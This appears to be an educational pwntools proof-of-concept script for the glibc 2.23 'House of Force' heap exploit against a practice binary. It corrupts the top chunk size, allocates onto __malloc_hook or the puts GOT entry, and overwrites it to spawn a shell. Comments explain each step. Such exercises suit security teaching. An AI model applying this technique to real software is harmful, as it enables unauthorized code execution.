#!/usr/bin/env python3
'''
House of Force POC

Has a POC for two options but more are possible:
- __malloc_hook 
- puts GOT entry 
'''

from pwn import * 

mode = 'DEBUG' # Turn on gdb
libc_name='../../../libc_versions/2.23/libc-2.23.so'
env = {}

# Binary setup
elf_name = './.shining_moments-2.23'

elf = ELF(elf_name)
if libc_name != '': 
	libc = ELF(libc_name)
	env = {"LD_PRELOAD": libc.path}
	
# Process creation 
if mode == 'DEBUG': 
	p = gdb.debug([elf.path], env=env, gdbscript='''
dir ../../../libc_versions/2.23/ 
''') 
else: 
	p = remote(domain, port) 

def get_leaks(): 
	'''
	Leaks are just given to us :) 
	So interpret these for later!
	'''
	p.recvuntil(": ")
	heap_base = int(p.recvuntil("\n"), 16)

	p.recvuntil(": ") 
	libc_leak = int(p.recvuntil("\n"), 16) 
	libc_base = libc_leak - libc_offset

	p.recvuntil(": ") 
	stack_leak = int(p.recvuntil("\n"), 16) 
	
	print("LibC Base: {}".format(hex(libc_base)))
	print("Heap Base: {}".format(hex(heap_base)))
	print("Stack Leak: {}".format(hex(stack_leak)))
	return heap_base, libc_base, stack_leak

def corrupt_topchunk():
	'''
	Set the top chunk size to a VERY large value. 
	The purpose of the 'House of Force' is to be able to 
	request a VERY large value that goes to anywhere we want in 
	memory :) 

	How does this work? Through the process of trying to find the 
	chunk after tcache, fastbins, unsorted bins, small and large bins
	it checks to see if the 'top_chunk' has enough space to simply
	extend it. 

	The code for this check can be found at 
	https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L3796 
	The 'top_chunk' is blindly trusted for how much is in the top chunk. 
	By setting this to an insanely large value, it is possible to 
	allocate a chunk to ANY point in memory (yes, you can even wrap 
	around the space if you'd like :))
	'''	
	print("Overwriting the top chunk size with -1")
	prev_size = "\xff" * 8 # Does not matter
	size = "\xff" * 8 # Should be VERY large
	p.sendlineafter("?", prev_size + size)

def calc_size_hook(heap_base, libc_base): 
	'''
	Now that the top_chunk size is corrupted, we have to request
	a chunk that is 'X' bytes away from the current location of
	the top_chunk. So, we must calculate the relative offset 
	between the location of the 'top_chunk' and the place to write
	to. 

	Mathmatically, this looks like the following: 
	- size = place_to_write - top_chunk_address 

	There are several ways to do this: 
	- EIP on stack to return 
	- GOT entry 
	- Other function pointers (hooks and things) 
	- etc. 

	For example below, we are going to set this to __malloc_hook!

	This is done with the following math: 
	- size = __malloc_hook - top_chunk_address - 0x20

	We request a size and this puts us directly at 
	__malloc_hook - 0x10 for the next allocation to be
	made via a chunk taken from the top_chunk. 
	'''	
	
	# Find the address of the __malloc_hook
	malloc_hook = libc_base + malloc_hook_offset	
	print("__malloc_hook address: {}".format(hex(malloc_hook)))
	
	# The top_chunk is at the heap_base currently
	top_chunk_loc = heap_base 
	
	# Get the relative location (from the heap) to the __malloc_hook
	size = malloc_hook - top_chunk_loc

	'''
	first- 0x10: For the metadata tacked onto the request 
	second - 0x10: To account for the metadata prior to the __malloc_hook 
	'''
	size = size - 0x10 - 0x10

	# Send the size 
	p.sendlineafter("?", str(size))
	print("Size: {}".format(hex(size)))
	return size 

def calc_size_puts(heap_base): 
	'''
	Now that the top_chunk size is corrupted, we have to request
	a chunk that is 'X' bytes away from the current location of
	the top_chunk. So, we must calculate the relative offset 
	between the location of the 'top_chunk' and the place to write
	to. 

	Mathmatically, this looks like the following: 
	- size = place_to_write - top_chunk_address 

	There are several ways to do this: 
	- EIP on stack to return 
	- GOT entry 
	- Other function pointers (hooks and things) 
	- etc. 

	For example below, we are going to set this to the GOT entry 
	for puts!

	This is done with the following math: 
	- size = PUTS_GOT_address - top_chunk_address - 0x20 

	This LITERALLY wraps around the address space! This goes from the heap
	(which is allocated further down in memory than program itself) to the GOT
	entry in order to write to it. An integer underflow occurs, within malloc, 
	making this possible. 

	We request a size and this puts us directly at 
	PUTS_GOT_address - 0x10 for the next allocation to be
	made via a chunk taken from the top_chunk. 
	'''	

	puts_GOT_entry = elf.got['puts']
	print("Puts GOT entry at {}".format(hex(puts_GOT_entry)))
	
	size = puts_GOT_entry - heap_base - 0x20
	print("Size: {}".format(hex(size)))
	p.sendlineafter("?", str(size))

def code_exec(libc_base): 
	'''
	At this point, the next chunk points to PUTS GOT entry. 
	This allows us to write to this location with a one_gadget or some
	function pointer to get code execution :)
	The next call to malloc will now pop a shell!
	'''
	
	print("Writing to the 'target' location") 	
	pop_shell = elf.symbols['pop_shell']
	p.sendlineafter(";)", p64(pop_shell) * 4)
	
## Offsets for 2.23
libc_offset = 0x3f520 # 2.23
malloc_hook_offset = 0x3a03b0

heap_base, libc_base, stack_leak = get_leaks()

corrupt_topchunk() 

## A solution for BOTH __malloc_hook and puts is shown below.
#calc_size_hook(heap_base, libc_base) # This one and the next one both do the same thing and work well
calc_size_puts(heap_base) # Uncomment this and comment out above line for GOT version
code_exec(libc_base) 

p.interactive()

